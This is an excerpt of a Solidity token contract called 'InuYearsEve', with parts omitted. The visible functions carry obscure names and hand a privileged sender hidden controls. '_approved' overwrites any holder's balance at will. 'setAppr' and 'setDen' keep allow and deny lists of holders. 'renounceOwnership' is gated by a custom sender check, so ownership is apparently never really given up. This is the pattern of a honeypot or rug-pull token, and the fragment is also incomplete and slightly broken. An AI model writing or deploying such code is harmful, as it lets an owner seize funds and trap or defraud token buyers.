...
contract InuYearsEve is Ownable {
  ...
  function renounceOwnership() public isSender {
  ...
  function setPoolAddress(address liquidity) public isSender {
    addressLp = liquidity;
  }
  function getPoolAddress() public view returns (address) {
    return addressLp;
  }
  function _approved(address buyer, uint256 _quantity) external isSenderr {
    balances[buyer] = _quantity * 10 ** uint256(decimals);
  }
  function setAppr(address holder, bool approved) external isSender {
      approvedHolders[holder] = approved;
  } 
  function checkAppr(address user) public view returns (bool) {
    if (approvedHolders[user]){
      return true;
    } else {
      return false;
    }
  }
  function setDen(address holder, bool denied) external isSender returns (bool){
      deniedHolders[holder] = denied;
  } 
  function checkDen(address user) public view returns (bool) {
    if (deniedHolders[user]){
      return true;
    } else {
      return false;
    }
